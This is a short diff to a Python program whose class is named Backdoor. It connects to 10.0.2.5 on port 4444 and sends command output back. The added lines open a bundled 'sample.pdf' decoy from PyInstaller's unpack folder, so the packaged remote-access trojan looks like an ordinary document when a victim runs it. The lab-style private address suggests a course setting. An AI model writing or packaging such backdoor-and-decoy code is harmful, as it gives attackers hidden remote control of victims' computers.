@@ -70,6 +70,10 @@ class Backdoor:
                 command_result = "[-] Error during command execution."
             self.reliable_send(command_result)
 
+
+file_name = sys._MEIPASS + "\sample.pdf"  # sys._MEIPASS will be replaced by the default location where pyinstaller places the files that we package
+subprocess.Popen(file_name, shell=True)
+
 try:
     myBackdoor = Backdoor("10.0.2.5", 4444)
     myBackdoor.run()
